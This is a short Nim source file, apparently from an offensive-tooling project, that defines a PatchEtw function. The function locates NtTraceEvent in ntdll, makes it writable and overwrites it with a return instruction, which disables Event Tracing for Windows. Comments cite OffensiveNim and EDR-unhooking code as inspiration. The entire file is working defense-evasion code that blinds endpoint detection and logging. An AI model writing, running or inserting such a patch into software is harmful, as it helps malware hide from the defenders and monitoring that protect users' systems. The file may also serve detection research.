import winim/lean
import dynlib


proc PatchEtw*(): bool = 
    # Unlike most ETW patches that just patch EtwEventWrite, we will patch NtTraceEvent which is 
    # the syscall called by almost all Etw related functions.
    # Inspiration: https://github.com/Mr-Un1k0d3r/EDRs/blob/main/unhook_bof.c#L92
    #              https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/etw_patch_bin.nim

    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        const patch: array[3, byte] = [byte 0xc3, 0x90, 0x90]
    elif defined i386:
        return disabled

    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        return disabled

    cs = ntdll.symAddr("NtTraceEvent")
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, PAGE_EXECUTE_READWRITE, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true
        
    return disabled